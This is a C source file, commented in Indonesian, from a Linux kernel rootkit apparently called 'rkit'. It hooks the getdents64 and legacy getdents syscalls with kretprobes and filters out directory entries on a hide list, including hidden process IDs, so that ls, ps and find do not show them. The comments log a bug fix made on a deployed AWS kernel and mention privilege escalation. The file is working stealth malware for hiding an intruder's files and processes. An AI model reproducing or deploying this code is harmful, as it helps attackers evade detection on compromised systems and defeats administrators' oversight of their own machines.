/*
 * hook_getdents.c — filter hasil readdir (kretprobe getdents64 + getdents lama).
 *
 * Mekanisme (JANTUNG penyembunyian file & proses):
 *   ps / ls / find membaca daftar lewat syscall getdents64 — dan kadang
 *   getdents lama (#78, tergantung versi glibc; contoh: el7 memakai78).
 *   kretprobe SESUDAH syscall: buffer user disalin ke kernel -> entri yang
 *   namanya cocok daftar hide DIBUANG (memmove) -> nilai balik dikurangi.
 *   -> pemanggil tak pernah melihat entri itu; akses PATH LANGSUNG tetap jalan.
 *
 * PERBAIKAN BUG LAPANGAN (2026-11-15, mesin 5.11.0-1021-aws):
 *   Dulu entry handler memakai regs->si LANGSUNG -> SALAH total. Fungsi yang
 *   diprobe adalah wrapper __x64_sys_getdents64(const struct pt_regs *) —
 *   argumen syscall asli ada DI DALAM struct pt_regs yang diwariskan lewat
 *   regs->di (pola SAMA dengan hook_kill.c — terbukti jalan via LPE).
 *   Akibat lama: user_buf = register sampah -> copy_from_user EFAULT
 *   diam-diam -> filter tak PERNAH jalan (file tetap tampil walau status
 *   /proc/rkit menyebut nama sudah masuk daftar).
 *
 * Target arsitektur: x86_64.
 */
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/stddef.h>
#include "rkit.h"

/* layout struct linux_dirent64 (uapi) — packed untuk hindari asumsi padding */
struct __attribute__((packed)) rk_dirent64 {
	u64               d_ino;
	u64               d_off;
	unsigned short    d_reclen;
	unsigned char     d_type;
	char              d_name[];
};

/* linux_dirent untuk syscall getdents LAMA (#78): tanpa d_type -> nama @18 */
struct __attribute__((packed)) rk_dirent32 {
	u64               d_ino;
	u64               d_off;
	unsigned short    d_reclen;
	char              d_name[];
};

#define NAME_OFF    offsetof(struct rk_dirent64, d_name)   /* 19 */
#define NAME_OFF_32 offsetof(struct rk_dirent32, d_name)   /* 18 */

struct gd_save {
	char __user *user_buf;
	unsigned int name_off;      /*19 utk getdents64,18 utk getdents lama */
};

static struct kretprobe rp_gd64;
static struct kretprobe rp_gd32;
static bool g_ok64, g_ok32;

/* apakah nama entri ini harus disembunyikan? */
static bool name_blocked(const char *n, unsigned int max)
{
	unsigned int i, l;

	if (!n || !max)
		return false;
	l = strnlen(n, max);
	if (!l)
		return false;

	/*1) kecocokan nama persis (hide by NAMA — berlaku file ATAU folder) */
	if (rk_is_hidden_name(n))
		return true;

	/*2) entri berupa angka penuh -> kandidat PID di /proc */
	for (i = 0; i < l; i++)
		if (!isdigit(n[i]))
			return false;
	return rk_is_hidden_pid(n);
}

/*
 * Ambil argumen syscall asli dari wrapper __x64_sys_*:
 *   regs->di = const struct pt_regs *  ->  di dalamnya: di=fd, si=buf, dx=count
 * (pola identik hook_kill.c yang TERBUKTI jalan — jangan pakai regs->si!)
 */
static int gd_entry_common(struct kretprobe_instance *ri, struct pt_regs *regs,
			   unsigned int name_off)
{
	struct gd_save *s = (struct gd_save *)ri->data;
	struct pt_regs *sregs = (struct pt_regs *)regs->di;

	s->user_buf = NULL;
	s->name_off = name_off;
	if (sregs)
		s->user_buf = (char __user *)sregs->si;
	return 0;
}

static int gd64_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return gd_entry_common(ri, regs, NAME_OFF);
}

static int gd32_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return gd_entry_common(ri, regs, NAME_OFF_32);
}

static int gd_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd_save *s = (struct gd_save *)ri->data;
	long ret = regs_return_value(regs);
	unsigned long pos = 0, out = 0;
	unsigned int noff;
	char *kb;

	if (!s->user_buf || ret <= 0 || ret > (1L << 24))   /* batas wajar */
		return 0;
	noff = s->name_off;

	kb = kmalloc((size_t)ret, GFP_KERNEL);
	if (!kb)
		return 0;
	if (copy_from_user(kb, s->user_buf, (unsigned long)ret)) {
		kfree(kb);
		return 0;
	}

	/* kompakkan: entri lolos disalin berurutan, entri terblok dilewati */
	while (pos + noff < (unsigned long)ret) {
		struct rk_dirent64 *d = (void *)(kb + pos);
		unsigned int reclen = d->d_reclen;

		if (reclen < noff + 1 || pos + reclen > (unsigned long)ret)
			break;                      /* buffer tidak konsisten */

		if (!name_blocked((const char *)d + noff, reclen - noff)) {
			if (out != pos)
				memmove(kb + out, d, reclen);
			out += reclen;
		}
		pos += reclen;
	}

	if (out != (unsigned long)ret) {
		/* kirim hasil tersaring; kalau copy gagal JANGAN ubah retval */
		if (copy_to_user(s->user_buf, kb, out) == 0)
			regs->ax = out;      /* ubah nilai balik syscall */
	}

	kfree(kb);
	return 0;
}

static int rp_setup(struct kretprobe *rp, const char *sym,
		    kretprobe_entry_handler_t entry)
{
	memset(rp, 0, sizeof(*rp));
	rp->kp.symbol_name = sym;
	rp->handler = gd_handler;
	rp->entry_handler = entry;
	rp->data_size = sizeof(struct gd_save);
	rp->maxactive = 32;
	return register_kretprobe(rp);
}

int rk_getdents_init(void)
{
	int e64, e32;

	e64 = rp_setup(&rp_gd64, "__x64_sys_getdents64", gd64_entry);
	g_ok64 = (e64 == 0);
	e32 = rp_setup(&rp_gd32, "__x64_sys_getdents", gd32_entry);
	g_ok32 = (e32 == 0);

	if (g_ok64 && g_ok32) {
		pr_info("rkit: hook getdents64 + getdents(78) aktif\n");
		return 0;
	}
	if (g_ok64 || g_ok32) {
		pr_warn("rkit: hook getdents PARSIAL (64:%d lama:%d)"
			" — tool glibc tertentu mungkin lolos\n", e64, e32);
		return 0;
	}
	pr_err("rkit: hook getdents gagal keduanya (%d/%d) — symbol salah?\n",
	       e64, e32);
	return e32 ? e32 : e64;
}

void rk_getdents_exit(void)
{
	if (g_ok64) {
		unregister_kretprobe(&rp_gd64);
		g_ok64 = false;
	}
	if (g_ok32) {
		unregister_kretprobe(&rp_gd32);
		g_ok32 = false;
	}
}
